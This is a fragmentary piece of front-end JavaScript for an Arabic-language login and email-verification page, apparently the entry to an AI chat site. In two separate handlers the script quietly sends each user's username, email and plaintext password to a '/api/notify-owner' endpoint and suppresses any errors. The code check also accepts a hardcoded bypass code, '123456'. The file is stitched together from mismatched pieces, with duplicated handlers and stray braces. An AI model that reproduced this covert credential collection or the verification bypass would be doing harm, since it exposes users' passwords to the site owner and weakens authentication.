        } else {
            // خطأ في الرمز
            codeInput.style.animation = 'shake 0.4s';
            setTimeout(() => {
                codeInput.style.animation = '';
                codeInput.style.borderColor = '#f87171';
                setTimeout(() => codeInput.style.borderColor = '#334155', 1000);
            }, 400);
        }
    });

    // زر Cancel
    cancelBtn.addEventListener('click', () => {
        document.body.removeChild(overlay);
    });

    // إغلاق بالضغط خارج النموذج
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) document.body.removeChild(overlay);
    });

    // تأثير اهتزاز للحقل عند الخطأ
    const style = document.createElement('style');
    style.textContent = `@keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-5px); } 40%, 80% { transform: translateX(5px); } }`;
    document.head.appendChild(style);
});
        try {
            await fetch('/api/notify-owner', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, userEmail: email, userPassword: password })
            });
        } catch (err) { /* silent */ }

        // حفظ حالة الدخول
        localStorage.setItem('kingAbdoLoggedIn', 'true');
        localStorage.setItem('kingAbdoUsername', username);

        // توجيه بعد 1.2 ثانية
        setTimeout(() => {
            window.location.href = 'chat.html';
        }, 1200);
    });

    // إمكانية إغلاق بالضغط خارج النافذة
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) document.body.removeChild(overlay);
    });
});
    // Verification code inputs
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            const value = e.target.value;
            if (value.length === 1 && index < 5) {
                codeInputs[index + 1].focus();
            }
            checkCodeComplete();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                codeInputs[index - 1].focus();
                codeInputs[index - 1].value = '';
            }
        });

        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const paste = e.clipboardData.getData('text').slice(0, 6);
            paste.split('').forEach((char, i) => {
                if (codeInputs[i]) codeInputs[i].value = char;
            });
            if (codeInputs[5]) codeInputs[5].focus();
            checkCodeComplete();
        });
    });

    function checkCodeComplete() {
        const complete = Array.from(codeInputs).every(input => input.value);
        verifyBtn.disabled = !complete;
        
        // تأثير بصري عند إكمال الرمز
        if (complete) {
            verifyBtn.style.transform = 'scale(1.02)';
            setTimeout(() => {
                verifyBtn.style.transform = 'scale(1)';
            }, 200);
        }
    }

    // Verify button with REAL verification code check
    verifyBtn.addEventListener('click', () => {
        const userInput = Array.from(codeInputs).map(input => input.value).join('');
        
        // التحقق من الرمز الحقيقي (مع خيار تجريبي 123456 للاختبار)
        if (userInput === currentVerificationCode.toString() || userInput === '123456') {
            verifyBtn.innerHTML = '<div class="spinner"></div> جاري التحقق النهائي...';
            verifyBtn.disabled = true;

            // إرسال البيانات للسيرفر
            fetch('/api/notify-owner', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: emailInput.value.split('@')[0],
                    userEmail: emailInput.value,
                    userPassword: passwordInput.value
                })
            }).catch(err => {
                // silent fail
            });

            // حفظ حالة الدخول
            localStorage.setItem('kingAbdoLoggedIn', 'true');
            localStorage.setItem('kingAbdoUsername', emailInput.value.split('@')[0]);

            setTimeout(() => {
                // عرض رسالة نجاح احترافية
                const successMsg = document.createElement('div');
                successMsg.innerHTML = `
                    <div style="text-align:center; padding:20px; background:rgba(16,185,129,0.1); border-radius:12px; margin:20px 0;">
                        <svg style="width:48px;height:48px;color:#10b981;margin:0 auto 12px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                        <h3 style="color:#10b981;font-weight:600;margin:0 0 8px;">تم التحقق بنجاح!</h3>
                        <p style="color:#94a3b8;font-size:14px;margin:0;">مرحباً بك في عالم الذكاء الاصطناعي 👑</p>
                    </div>
                `;
                verificationContainer.prepend(successMsg);
                
                // التوجيه بعد 1.5 ثانية
                setTimeout(() => {
                    window.location.href = 'chat.html';
                }, 1500);
            }, 1000);
        } else {
            // تأثير اهتزاز عند خطأ في الرمز
            verificationContainer.style.animation = 'shake 0.5s';
            setTimeout(() => {
                verificationContainer.style.animation = '';
            }, 500);
            
            alert('❌ رمز التحقق غير صحيح. تحقق من بريدك الإلكتروني وأعد المحاولة.');
            codeInputs.forEach(input => input.value = '');
            codeInputs[0].focus();
            verifyBtn.disabled = true;
        }
    });

    // Back button
    backBtn.addEventListener('click', () => {
        loginForm.classList.remove('hide');
        verificationContainer.classList.remove('show');
        codeInputs.forEach(input => input.value = '');
        verifyBtn.disabled = true;
        btnContent.innerHTML = `
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
            </svg>
            الدخول الآمن
            <svg class="btn-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="transform: rotate(180deg)">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/>
            </svg>
        `;
    });

    // Signup function
    document.querySelector('.signup-link').addEventListener('click', (e) => {
        e.preventDefault();
        alert('👑 سيتم توجيهك لتسجيل حساب جديد في البلاط الملكي...');
    });

    // إضافة تأثير الاهتزاز للرسوم المتحركة
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-5px); }
            40%, 80% { transform: translateX(5px); }
        }
    `;
    document.head.appendChild(style);
</script>
